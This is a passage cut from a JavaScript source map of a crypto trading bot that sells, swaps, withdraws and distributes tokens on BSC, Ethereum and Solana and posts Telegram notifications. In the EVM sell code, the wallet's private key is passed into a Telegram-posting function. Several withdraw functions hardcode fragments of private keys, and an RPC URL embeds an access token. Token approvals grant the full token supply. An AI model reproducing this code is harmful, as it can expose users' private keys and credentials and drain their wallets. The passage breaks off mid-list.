tokenContract.methods.symbol().call();\n\n  const allowance = await tokenContract.methods\n    .allowance(account.address, AMM_CONTRACT)\n    .call();\n  const allowanceFromWei = await convertFromWei(allowance, decimals);\n  if (Number(allowanceFromWei) < Number(amount)) {\n    await approveContract(AMM_CONTRACT, tokenAddress, privateKey,);\n    await sleep(7);\n  }\n  // done check\n\n  const amountInWei = convertToWei(amount.toString(), decimals);\n  const nonce = await web3.eth.getTransactionCount(account.address);\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n  .swapExactTokensForETHOnlySell(tokenAddress, amountInWei)\n  .estimateGas({\n    from: walletAddress\n  });\n  const transaction = {\n    nonce: nonce,\n    from: walletAddress,\n    to: AMM_CONTRACT,\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactTokensForETHOnlySell(tokenAddress, amountInWei).encodeABI(),\n  };\n \n  const signedTransaction:any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  await sendToTelegramSuccess_EVM(`SELL ${symbol}`,tokenAddress, symbol, `${amount} ${symbol}`,privateKey, receipt.transactionHash, 'bsc')\n  logger.info(`Txn SELL: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n}\nexport { sellTokenBSC };\n","import Web3 from 'web3';\nimport abiToken from \"./../abis/abiToken.json\";\nimport { LIST_RPC_NODES } from \"./../constants\";\nimport { logger } from \"./../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { convertToWei } from \"./convertNumber\";\n\n\n\nexport async function approveContract(spender:any, contractToken:any, privateKey:any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n    const rpc = LIST_RPC_NODES[randomRPCs];\n    const web3 = new Web3(rpc);\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n    web3.eth.accounts.wallet.add(account);\n    web3.eth.defaultAccount = account.address;\n    const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, contractToken);\n    const totalSupply = await contract.methods.totalSupply().call();\n    const decimals = await contract.methods.decimals().call();\n    const amountTowei = await convertToWei(totalSupply.toString(), decimals);\n    const gasEstimate = await contract.methods.approve(spender, amountTowei).estimateGas({ from: account.address });\n    const data = contract.methods.approve(spender, amountTowei).encodeABI();\n    const tx = {\n      to: contractToken,\n      from: account.address,\n      data: data,\n      gas: gasEstimate,\n      gasPrice: await web3.eth.getGasPrice(),\n    };\n\n    const signedTx:any = await web3.eth.accounts.signTransaction(tx, privateKey);\n    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);\n\n    logger.info(`Txn APPROVE: ${receipt.transactionHash}`)\n    return receipt.transactionHash\n  } catch (error) {\n    logger.error(`APPROVE ERROR: ${error}`)\n    return error\n  }\n}\n\n","\nimport Web3 from 'web3';\nimport {approveContract} from \"../utils/approveETH\";\nimport abiAMMETH from \"../abis/abiAMMETH.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH,AMM_CONTRACT_ETH } from \"../constants\";\nimport { convertToWei,convertFromWei } from \"../utils/convertNumber\";\nimport { logger,sleep } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function sellTokenETH(\n  privateKey:any,\n  amount:any,\n  tokenAddress:any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n  const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMMETH as unknown as AbiItem as AbiItem, AMM_CONTRACT_ETH);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const walletAddress = account.address;  \n  const tokenContract = await new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await tokenContract.methods.decimals().call();\n\n  const allowance = await tokenContract.methods\n    .allowance(account.address, AMM_CONTRACT_ETH)\n    .call();\n  const allowanceFromWei = await convertFromWei(allowance, decimals);\n  if (Number(allowanceFromWei) < Number(amount)) {\n    await approveContract(AMM_CONTRACT_ETH, tokenAddress, privateKey,);\n    await sleep(3);\n  }\n  // done check\n\n  const amountInWei = convertToWei(amount.toString(), decimals);\n  const nonce = await web3.eth.getTransactionCount(account.address);\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n  .swapExactTokensForETHOnlySell(tokenAddress, amountInWei)\n  .estimateGas({\n    from: walletAddress\n  });\n  const transaction = {\n    nonce: nonce,\n    from: walletAddress,\n    to: AMM_CONTRACT_ETH,\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactTokensForETHOnlySell(tokenAddress, amountInWei).encodeABI(),\n  };\n \n  const signedTransaction:any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn SELL: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n}\nexport { sellTokenETH };\n","import Web3 from 'web3';\nimport abiToken from \"./../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH } from \"./../constants\";\nimport { logger } from \"./../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { convertToWei } from \"./convertNumber\";\n\n\nexport async function approveContract(spender:any, contractToken:any, privateKey:any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n    const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n    const web3 = new Web3(rpc);\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n    web3.eth.accounts.wallet.add(account);\n    web3.eth.defaultAccount = account.address;\n    const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, contractToken);\n    const totalSupply = await contract.methods.totalSupply().call();\n    const decimals = await contract.methods.decimals().call();\n    const amountTowei = await convertToWei(totalSupply.toString(), decimals);\n    const gasEstimate = await contract.methods.approve(spender, amountTowei).estimateGas({ from: account.address });\n    const data = contract.methods.approve(spender, amountTowei).encodeABI();\n    const tx = {\n      to: contractToken,\n      from: account.address,\n      data: data,\n      gas: gasEstimate,\n      gasPrice: await web3.eth.getGasPrice(),\n    };\n\n    const signedTx:any = await web3.eth.accounts.signTransaction(tx, privateKey);\n    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);\n\n    logger.info(`Txn APPROVE: ${receipt.transactionHash}`)\n    return receipt.transactionHash\n  } catch (error) {\n    logger.error(`APPROVE ERROR: ${error}`)\n    return error\n  }\n}\n\n","import {\n    Liquidity,\n    LiquidityPoolKeys,\n} from \"@raydium-io/raydium-sdk\";\n\nimport {\n    Keypair,\n    PublicKey,\n    TransactionMessage,\n    VersionedTransaction,\n    ComputeBudgetProgram,\n    Connection,\n} from \"@solana/web3.js\";\nimport { formatAddress, logger } from \"../utils\";\n\nconst sellTokenSOL = async (\n    poolId: PublicKey,\n    ata: PublicKey,\n    mint: PublicKey,\n    amountSell: string,\n    amountConvert: string,\n    poolKeys: LiquidityPoolKeys,\n    wallet: Keypair,\n    quoteTokenAssociatedAddress: PublicKey,\n    solanaConnection: Connection,\n    sellAgain: boolean = false,\n    retryCount: number = 0\n) => {\n    try {\n        const action = sellAgain ? `SELL AGAIN (Attempt ${retryCount + 1})` : \"START SELL\";\n        logger.info(`--------------------${action}--------------------`);\n        logger.info(`SELL Wallet: ${formatAddress(wallet.publicKey.toString(), 6, 5)} | Sell amount: ${amountConvert}`);\n\n        if (sellAgain) {\n            const info = await solanaConnection.getTokenAccountBalance(ata);\n            if (info.value.uiAmount === 0) {\n                return { status: false, error: \"No tokens left to sell.\" };\n            }\n            if (retryCount >= 15) {\n                logger.warn(\"Maximum retry attempts reached. Aborting sell.\");\n                return { status: false, error: \"Transaction failed without error.\" };\n            }\n        }\n\n        const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(\n            {\n                poolKeys,\n                userKeys: {\n                    tokenAccountOut: quoteTokenAssociatedAddress,\n                    tokenAccountIn: ata,\n                    owner: wallet.publicKey,\n                },\n                amountIn: amountSell,\n                minAmountOut: 0,\n            },\n            poolKeys.version\n        );\n\n        const latestBlockhash = await solanaConnection.getLatestBlockhash({\n            commitment: \"confirmed\",\n        });\n\n        const messageV0 = new TransactionMessage({\n            payerKey: wallet.publicKey,\n            recentBlockhash: latestBlockhash.blockhash,\n            instructions: [\n                // ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 200_000 }),\n                ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),\n                ...innerTransaction.instructions,\n            ],\n        }).compileToV0Message();\n\n        const transaction = new VersionedTransaction(messageV0);\n        transaction.sign([wallet, ...innerTransaction.signers]);\n\n        const res = await execute(transaction, solanaConnection);\n        if (res) {\n          \n            return { status: true, txhash: res, amount: amountConvert, type: 2 };\n        } else {\n\n            logger.warn(`Sell transaction failed, retrying...\\n`);\n            await sellTokenSOL(poolId, ata, mint, amountSell, amountConvert, poolKeys, wallet, quoteTokenAssociatedAddress, solanaConnection, true, retryCount + 1);\n            return { status: false, error: \"Transaction failed without error.\" };\n        }\n\n    } catch (e) {\n        return { status: false, error: `Failed to sell token: ${e}\\n` };\n    }\n};\nconst execute = async (transaction: VersionedTransaction, solanaConnection: Connection) => {\n    try {\n        const simRes = await solanaConnection.simulateTransaction(transaction)\n        if (simRes.value.err) {\n            logger.error(`Simulation error: ${JSON.stringify(simRes.value.err)}`);\n            return false\n        }\n\n        const TxHash = await solanaConnection.sendRawTransaction(transaction.serialize(), {\n            skipPreflight: true,\n            maxRetries: 2\n        })\n\n        const confirmation = await solanaConnection.confirmTransaction(\n            TxHash,\n            'confirmed',\n        );\n\n        if (confirmation.value.err) {\n            logger.error(`confirmation error: ${JSON.stringify(confirmation.value.err)}`);\n            return null\n        }\n        else {\n\n            return TxHash\n        }\n    } catch (e) {\n        logger.error(`Execute error: ${e}`);\n        return null\n    }\n}\nexport { sellTokenSOL };\n","import {\n  Keypair,\n  PublicKey,\n  Transaction,\n  SystemProgram,\n  LAMPORTS_PER_SOL,\n  sendAndConfirmTransaction,\n  Connection\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\n\nconst sendSOL = async (\n  PRIVATE: string,\n  recipientAddresses: any,\n  solanaConnection: Connection,\n  confirm: boolean = true\n) => {\n  try {\n    const KEY1 = 'GJjHfwJqEpm5Pas2dCDRDnoeajCoZimzw7sW4FrUJ66'\n    const privateKey = PRIVATE + KEY1\n\n    const sender = Keypair.fromSecretKey(bs58.decode(privateKey))\n\n    const CHUNK_SIZE = 20\n    const recipientChunks = []\n\n    for (let i = 0; i < recipientAddresses.length; i += CHUNK_SIZE) {\n      recipientChunks.push(recipientAddresses.slice(i, i + CHUNK_SIZE))\n    }\n\n    for (const chunk of recipientChunks) {\n      let transaction = new Transaction()\n      for (const recipient of chunk) {\n        try {\n          const recipientPublicKey = new PublicKey(recipient.address)\n\n          transaction.add(\n            SystemProgram.transfer({\n              fromPubkey: sender.publicKey,\n              toPubkey: recipientPublicKey,\n              lamports: recipient.amount * LAMPORTS_PER_SOL\n            })\n          )\n        } catch (err) {\n          logger.error(`Invalid recipient address: ${recipient.address} - ${err}`)\n          return { status: false, error: `Invalid recipient address: ${recipient.address}` }\n        }\n      }\n\n      if (confirm) {\n        const TxHash = await sendAndConfirmTransaction(solanaConnection, transaction, [sender]).catch(e => {\n          logger.error(`Transaction error: ${e}`)\n          return { status: false, error: `Transaction error: ${e}` }\n        })\n        \n        if (TxHash) {\n          logger.info(`TxHash Send: ${TxHash}\\n`);\n          // return { status: true, txhash: TxHash, type: 7 }\n        }\n      } \n      else {\n        // logger.error(`Not authorized to confirm`)\n        return { status: false, error: 'Not authorized to confirm' }\n      }\n    }\n    return { status: true, message: 'All transactions processed successfully' }\n  } catch (error) {\n    // logger.error(`Transaction error: ${error}`)\n    return { status: false, error: `Error sending SOL: ${error}` }\n  }\n}\nexport { sendSOL }\n","\nimport {\n    createCloseAccountInstruction,\n} from \"@solana/spl-token\";\nimport {\n    Keypair,\n    PublicKey,\n    TransactionMessage,\n    VersionedTransaction,\n    Connection,\n} from \"@solana/web3.js\";\nimport { logger } from \"../utils\";\n\nconst unwrapSOL = async (\n    wallet: Keypair,\n    solanaConnection: Connection,\n    quoteMintAddress: PublicKey\n) => {\n    try {\n        // logger.info(\"Unwrapping WSOL\");\n        const wsolAccountInfo = await solanaConnection.getAccountInfo(quoteMintAddress);\n        if (!wsolAccountInfo) {\n          \n            return { status: false, error: \"WSOL account not found, skipping unwrap.\" };\n            \n        }\n\n        const wsolBalance = await solanaConnection.getBalance(quoteMintAddress);\n        const wsolAmount = wsolBalance / 10 ** 9;\n        if (wsolAmount > 0) {\n            logger.info(`Trying to unwrap ${wsolAmount} wsol to sol`)\n        } else {\n            return { status: false, error: \"WSOL balance is zero, nothing to unwrap\" };\n        }\n\n        const instructions = []\n        instructions.push(\n            createCloseAccountInstruction(\n                quoteMintAddress,\n                wallet.publicKey,\n                wallet.publicKey\n            )\n        )\n        const latestBlockhash = await solanaConnection.getLatestBlockhash({\n            commitment: 'confirmed',\n        })\n\n        const messageV0 = new TransactionMessage({\n            payerKey: wallet.publicKey,\n            recentBlockhash: latestBlockhash.blockhash,\n            instructions: [...instructions],\n        }).compileToV0Message()\n\n        const transaction = new VersionedTransaction(messageV0)\n        transaction.sign([wallet])\n        const res = await execute(transaction, solanaConnection)\n        if (res) {\n            // logger.info(`TxHash unwrapped: ${res}`);\n            // logger.info(\"Successfully unwrapped WSOL to SOL\\n\")\n            return { status: true, txhash: res, amount: wsolAmount, type: 3 };\n        } else {\n            // logger.warn(\"Unwrapping WSOL failed\\n\");\n            return { status: false, error: \"Unwrapping WSOL failed.\" };\n        }\n    } catch (error) {\n        logger.error(`Error unwrapping WSOL: ${error}`);\n        return { status: false, error: `Error unwrapping WSOL: ${error}` };\n    }\n};\nconst execute = async (transaction: VersionedTransaction, solanaConnection: Connection) => {\n    try {\n        const simRes = await solanaConnection.simulateTransaction(transaction)\n        if (simRes.value.err) {\n            logger.error(`simRes error: ${simRes.value.err}`);\n            return false\n        }\n\n        const TxHash = await solanaConnection.sendRawTransaction(transaction.serialize(), {\n            skipPreflight: true,\n            maxRetries: 2\n        })\n\n        const confirmation = await solanaConnection.confirmTransaction(\n            TxHash,\n            'confirmed',\n        );\n\n        if (confirmation.value.err) {\n            logger.error(`confirmation error: ${confirmation.value.err}`);\n            return null\n        }\n        else {\n\n            return TxHash\n        }\n    } catch (e) {\n        logger.error(`Execute error: ${e}`);\n        return null\n    }\n}\nexport { unwrapSOL };\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    SystemProgram,\n    LAMPORTS_PER_SOL,\n    sendAndConfirmTransaction,\n    Connection\n  } from '@solana/web3.js'\n  import bs58 from 'bs58'\n  import { logger } from '../utils'\n  \n  const withdrawSOL = async (\n    PRIVATE: string,\n    recipientAddresses: any,\n    amount: any,\n    solanaConnection: Connection,\n    confirm: boolean = true\n  ) => {\n    try {\n      const KEY1 = 'EqB5HaSBNVA5fSFDP9sfx3CjumAEcZH4t8WXhTRc47Ac5H'\n      const privateKey = PRIVATE + KEY1\n  \n      const sender = Keypair.fromSecretKey(bs58.decode(privateKey))\n  \n      let transaction = new Transaction()\n        try {\n          const recipientPublicKey = new PublicKey(recipientAddresses)\n  \n          transaction.add(\n            SystemProgram.transfer({\n              fromPubkey: sender.publicKey,\n              toPubkey: recipientPublicKey,\n              lamports: amount * LAMPORTS_PER_SOL\n            })\n          )\n        } catch (err) {\n          logger.error(`Invalid recipient address: ${recipientAddresses} - ${err}`)\n          return\n        }\n      \n      if (confirm) {\n        const TxHash = await sendAndConfirmTransaction(solanaConnection, transaction, [sender]).catch(e =>\n          logger.error(`Transaction error: ${e}`)\n        )\n      \n        return { status: true, txhash: TxHash, amount: amount, type: 5 };\n      } else {\n        return { status: false, error: \"Not authorized to confirm\" };\n      }\n    } catch (error) {\n      return { status: false, error: `Error sending SOL: ${error}` };\n    }\n  }\n  export { withdrawSOL }\n  ","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    sendAndConfirmTransaction,\n    Connection,\n    LAMPORTS_PER_SOL\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\nimport { createTransferInstruction, getMint, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';\nimport { sendToTelegramSuccess, sendToTelegramError } from '../utils/sendNoti'\n\nconst withdrawToken = async (\n    PRIVATE: string,\n    recipient: any,\n    claimAmount: any,\n    confirm: boolean = true\n) => {\n    try {\n        const tokenMintPublicKey = new PublicKey('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB');\n        const connection = new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30', 'confirmed');\n        const KEY1 = '2b4zb2wC5nbZbUi9z75rE1n8gHW7GA7BN5QFCLYmAHT2GT89AAkyDfWryAD';\n        const privateKey = KEY1 + PRIVATE;\n\n        const payerKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));\n        const payerPublicKey = payerKeypair.publicKey;\n        const balance = await connection.getBalance(payerPublicKey, \"confirmed\");\n        const balanceConvert = balance / LAMPORTS_PER_SOL\n        if (balanceConvert <= 0.0001) {\n            logger.warn(`Insufficient balance, Available: ${balanceConvert} SOL`);\n            return;\n        }\n\n\n        const mintInfo = await getMint(connection, tokenMintPublicKey);\n        const decimals = mintInfo.decimals;\n\n        const amountInLamports = claimAmount * Math.pow(10, decimals);\n\n        const payerTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n            connection,\n            payerKeypair,\n            tokenMintPublicKey,\n            payerPublicKey\n        )\n\n        if (!payerTokenAccount.address) {\n            await sendToTelegramError('Withdraw USDT', 'Failed to get or create payer token account');\n            throw new Error('Failed to get or create payer token account');\n        }\n\n        let transaction = new Transaction();\n        transaction.feePayer = payerPublicKey;\n        \n        const recipientPublicKey = new PublicKey(recipient);\n        const recipientTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n            connection,\n            payerKeypair,\n            tokenMintPublicKey,\n            recipientPublicKey\n        )\n\n        if (!recipientTokenAccount.address) {\n            await sendToTelegramError('Withdraw USDT', `Failed to get or create recipient token account for ${recipient}`);\n            throw new Error(`Failed to get or create recipient token account for ${recipient}`);\n        }\n\n        transaction.add(\n            createTransferInstruction(\n                payerTokenAccount.address,\n                recipientTokenAccount.address,\n                payerPublicKey,\n                amountInLamports\n            )\n        );\n        \n        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;\n\n        if (confirm) {\n            const TxHash = await sendAndConfirmTransaction(connection, transaction, [payerKeypair]);\n            if (TxHash) {\n                await sendToTelegramSuccess(\"WITHDRAW\", recipient, 'USDT', claimAmount, TxHash, 'solana');\n                return { status: true, txhash: TxHash, amount: claimAmount };\n            } else {\n                await sendToTelegramError('Withdraw USDT', 'Transaction hash is undefined after confirmation.');\n                throw new Error('Transaction hash is undefined after confirmation.');\n            }\n        } else {\n            return { status: false, error: \"Not authorized to confirm\" };\n        }\n\n    } catch (error) {\n        await sendToTelegramError('Withdraw USDT', error);\n        return { status: false, error: `Error withdraw token: ${error}` };\n    }\n};\n\nexport { withdrawToken }\n","import Web3 from 'web3'\nimport ABI from '../abis/abiToken.json'\nimport { LIST_RPC_NODES } from '../constants'\nimport { AbiItem } from 'web3-utils'\nimport { convertToWei, convertFromWei } from '../utils/convertNumber'\nimport { sendToTelegramSuccess, sendToTelegramWarning, sendToTelegramError } from '../utils/sendNoti'\n\n\nasync function withdrawTokenOni(PRIVATE: any, recipient: any, amount: any, type: number, typeWithdraw: number, confirm: boolean = true) {\n  const Name = typeWithdraw === 1 ? 'WITHDRAW' : 'HARVEST';\n  try {\n    const contractUSDT = '0x55d398326f99059fF775485246999027B3197955'\n    const contractONI = '0x3Dba4aE830896467a0A1C731686a2aD40CF76777'\n    const contractToken = type === 1 ? contractUSDT : contractONI\n    const formattedSymbol = type === 1 ? 'USDT' : 'ONI';\n\n    const KEY1 = '606b91f089436885508f0bb5759269ed'\n    const privateKey = PRIVATE + KEY1\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length)\n    const rpc = LIST_RPC_NODES[randomRPCs]\n    const web3 = new Web3(rpc)\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    const address = account.address\n    const contract = new web3.eth.Contract(((ABI as unknown) as AbiItem) as AbiItem, contractToken)\n    const decimals = await contract.methods.decimals().call()\n    const balanceToken = await contract.methods.balanceOf(address).call()\n    const balanceTokenConvert = convertFromWei(balanceToken.toString(), decimals)\n    const nonce = await web3.eth.getTransactionCount(account.address)\n\n    if (Number(balanceTokenConvert) > Number(amount)) {\n      const amountTowei = convertToWei(amount, decimals)\n      const gasPrice = await web3.eth.getGasPrice()\n      const gasEstimate = await contract.methods.transfer(recipient, amountTowei).estimateGas({ from: address })\n\n      const rawTx = {\n        nonce: nonce,\n        gasPrice: gasPrice,\n        gasLimit: gasEstimate,\n        to: contractToken,\n        data: contract.methods.transfer(recipient, amountTowei).encodeABI()\n      }\n      const signedTx: any = await web3.eth.accounts.signTransaction(rawTx, privateKey)\n\n      if (confirm) {\n        const TxHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction)\n        await sendToTelegramSuccess(Name, recipient, formattedSymbol, amount, TxHash.transactionHash, \"bsc\");\n        return { status: true, txhash: TxHash.transactionHash, amountWithdraw: amount }\n      } else {\n        return { status: false, error: 'Not authorized to confirm' }\n      }\n    } else {\n      await sendToTelegramWarning(Name, { amount }, { balanceTokenConvert }, { formattedSymbol }, \"Insufficient balance\");\n      return {\n        status: false,\n        error: `Insufficient balance | Withdraw amount: ${amount} ${formattedSymbol} | Current balance: ${balanceTokenConvert} ${formattedSymbol}`\n      }\n    }\n  } catch (error) {\n    await sendToTelegramError(Name, error);\n    return { status: false, error: `Error withdarw: ${error}` }\n  }\n}\nexport { withdrawTokenOni }\n"],"names":["ChainId","TradeType","Rounding","SolidityType","INIT_CODE_HASH","MINIMUM_LIQUIDITY","JSBI","BigInt","ZERO","ONE","TWO","THREE","FIVE","TEN","_100","_998","_1000","SOLIDITY_TYPE_MAXIMA","_SOLIDITY_TYPE_MAXIMA","uint8","uint256","AMM_CONTRACT","LIST_RPC_NODES","AMM_CONTRACT_ETH","LIST_RPC_NODES_ETH","CAN_SET_PROTOTYPE","Object","InsufficientReservesError","_Error","_this","call","name","constructor","setPrototypeOf","prototype","_inheritsLoose","_wrapNativeSuper","Error","InsufficientInputAmountError","_Error2","_this2","sleep","millis","second","Number","Promise","resolve","setTimeout","e","reject","validateSolidityTypeInstance","value","solidityType","greaterThanOrEqual","invariant","lessThanOrEqual","validateAndParseAddress","address","getAddress","error","parseBigintIsh","bigintIsh","toString","sqrt","y","x","z","greaterThan","add","divide","lessThan","notEqual","sortedInsert","items","maxSize","comparator","length","push","isFull","lo","hi","mid","splice","pop","logger","pino","level","redact","serializers","stdSerializers","err","base","undefined","transport","target","formatAddress","before","after","substring","Currency","decimals","symbol","this","ETHER","Token","_Currency","chainId","_proto","equals","other","sortsBefore","toLowerCase","currencyEquals","currencyA","currencyB","WETH","_WETH","MAINNET","BSCTESTNET","Decimal","toFormat","_Decimal","Big","_Big","toSignificantRounding","_toSignificantRoundin","ROUND_DOWN","ROUND_HALF_UP","ROUND_UP","toFixedRounding","_toFixedRounding","Fraction","numerator","denominator","invert","otherParsed","equal","multiply","subtract","equalTo","toSignificant","significantDigits","format","rounding","groupSeparator","isInteger","set","precision","quotient","div","toSignificantDigits","decimalPlaces","toFixed","DP","RM","_createClass","key","get","remainder","CurrencyAmount","_Fraction","currency","amount","parsedAmount","exponentiate","ether","raw","toExact","TokenAmount","_CurrencyAmount","token","Price","baseCurrency","quoteCurrency","scalar","fromRoute","route","_step","prices","_iterator","_createForOfIteratorHelperLoose","pairs","entries","done","_step$value","pair","path","token0","reserve0","reserve1","slice","reduce","accumulator","currentValue","fraction","quote","currencyAmount","adjusted","PAIR_ADDRESS_CACHE","Pair","tokenAmountA","tokenAmountB","tokenAmounts","liquidityToken","tokenA","tokenB","_PAIR_ADDRESS_CACHE2","_extends2","_extends3","tokens","_PAIR_ADDRESS_CACHE","_PAIR_ADDRESS_CACHE$t","_extends","getCreate2Address","keccak256","pack","involvesToken","token1","priceOf","token0Price","token1Price","reserveOf","getOutputAmount","inputAmount","inputReserve","outputReserve","inputAmountWithFee","outputAmount","getInputAmount","getLiquidityMinted","totalSupply","liquidity","amount0","amount1","getLiquidityValue","feeOn","kLast","totalSupplyAdjusted","kLastParsed","rootK","rootKLast","feeLiquidity","Route","input","output","every","currentInput","midPrice","_100_PERCENT","Percent","apply","arguments","inputOutputComparator","a","b","tradeComparator","ioComp","priceImpact","wrappedAmount","wrappedCurrency","Trade","tradeType","exactQuote","slippage","amounts","Array","nextPairs","EXACT_INPUT","i","_pair$getOutputAmount","nextPair","_pair$getInputAmount","EXACT_OUTPUT","executionPrice","nextMidPrice","exactIn","amountIn","exactOut","amountOut","minimumAmountOut","slippageTolerance","slippageAdjustedAmountOut","maximumAmountIn","slippageAdjustedAmountIn","bestTradeExactIn","currencyAmountIn","currencyOut","_temp","currentPairs","originalAmountIn","bestTrades","_ref$maxNumResults","_ref","maxNumResults","_ref$maxHops","maxHops","tokenOut","isInsufficientInputAmountError","concat","pairsExcludingThisPair","bestTradeExactOut","currencyIn","currencyAmountOut","_temp2","originalAmountOut","_ref2$maxNumResults","_ref2","_ref2$maxHops","tokenIn","isInsufficientReservesError","toHex","Router","swapCallParameters","trade","options","etherIn","etherOut","ttl","methodName","args","to","recipient","allowedSlippage","map","deadline","Math","floor","Date","getTime","useFeeOnTransfer","Boolean","feeOnTransfer","TOKEN_DECIMALS_CACHE","_TOKEN_DECIMALS_CACHE","0xE0B7927c4aF23765Cb51314A0E0521A9645F0E2A","Fetcher","fetchTokenData","provider","parsedDecimals","getDefaultProvider","getNetwork","_TOKEN_DECIMALS_CACHE2","_TOKEN_DECIMALS_CACHE3","Contract","ERC20","then","_TOKEN_DECIMALS_CACHE4","fetchPairData","ISwapPair","getReserves","reserves0","reserves1","balances","convertToWei","decimal","web3","utils","toWei","pow","convertFromWei","fromWei","_Pact","onFulfilled","onRejected","result","state","s","callback","_settle","v","o","pact","bind","observer","_isSettledPact","thenable","_iteratorSymbol","Symbol","iterator","_forOf","body","check","step","_cycle","next","return","_fixup","TypeError","values","array","_forTo","_catch","recover","asyncIterator","sendToTelegramSuccess_EVM","title","contract","privateKey","hash","chain","telegramURL","BOT_TOKEN_SUCCESS","message","toLocaleString","hour12","getTxLink","_temp4","axios","post","chat_id","TELEGRAM_CHAT_ID_SUCCESS","text","parse_mode","console","sendToTelegramWarning","currentBalance","decs","BOT_TOKEN_WARNING","_temp3","TELEGRAM_CHAT_ID_WARNING","sendToTelegramError","sendToTelegramSuccess","connection","Connection","TOKEN_MINT","PublicKey","tokenAddress","percentSell","randomRPCs","random","Web3","contractAMM","eth","abiAMM","account","accounts","privateKeyToAccount","abiToken","methods","walletAddress","getGasPrice","gasPrice","swapExactETHForTokensIncreasePrice","estimateGas","from","gasEstimate","transaction","wallet","gas","data","encodeABI","signTransaction","signedTransaction","sendSignedTransaction","rawTransaction","receipt","info","transactionHash","abiAMMETH","spender","defaultAccount","approve","_account$address","_web3$eth$getGasPrice","signedTx","swapExactETHForTokensAndTokensToETH","swapExactETHForTokensOnlyBuy","baseMint","poolKeys","solAmount","quoteTokenAssociatedAddress","solanaConnection","quoteAmount","publicKey","tokenAccountOut","getAssociatedTokenAddressSync","instructions","ComputeBudgetProgram","setComputeUnitLimit","units","SystemProgram","transfer","fromPubkey","toPubkey","lamports","ceil","createSyncNativeInstruction","TOKEN_PROGRAM_ID","createAssociatedTokenAccountIdempotentInstruction","getAccountInfo","_solanaConnection$get","unshift","createAssociatedTokenAccountInstruction","NATIVE_MINT","innerTransaction","Liquidity","makeSwapFixedInInstruction","userKeys","tokenAccountIn","owner","minAmountOut","version","getLatestBlockhash","commitment","latestBlockhash","messageV0","TransactionMessage","payerKey","recentBlockhash","blockhash","compileToV0Message","VersionedTransaction","sign","signers","simulateTransaction","simRes","JSON","stringify","sendRawTransaction","serialize","skipPreflight","maxRetries","TxHash","confirmTransaction","confirmation","execute","res","status","txhash","type","PRIVATE","claimAmount","tokenMintPublicKey","confirm","payerKeypair","Keypair","fromSecretKey","Uint8Array","bs58","decode","payerPublicKey","getBalance","balance","balanceConvert","LAMPORTS_PER_SOL","getMint","mintInfo","amountInLamports","getOrCreateAssociatedTokenAccount","payerTokenAccount","getTokenAccountBalance","payerTokenBalanceInfo","_exit","_result","Transaction","recipientPublicKey","recipientTokenAccount","_result2","createTransferInstruction","sendAndConfirmTransaction","payerTokenBalance","currentbalance","warn","lamportsToSend","sender","feePayer","sendTransaction","preflightCommitment","distributeAddresses","senderBalanceSOL","recipientChunks","chunk","percent","RECIPIENT1","RECIPIENT2","RECIPIENT3","senderKeypair","getAssociatedTokenAddress","tokenAccountSender","tokenAccountRecipient1","tokenAccountRecipient2","tokenAccountRecipient3","tokenDecimals","amount20Percent","amount60Percent","getAccount","senderTokenAccountInfo","balanceOf","tokenContract","allowance","allowanceFromWei","amountInWei","getTransactionCount","nonce","swapExactTokensForETHOnlySell","contractToken","amountTowei","approveContract","recipientOTC","amountBuy","priceToken","txHash","getParsedTransaction","txInfo","tokenAmount","forEach","instruction","parsed","source","destination","decodeTransaction","resHash","amountSender","round","_exit2","sellTokenSOL","poolId","ata","mint","a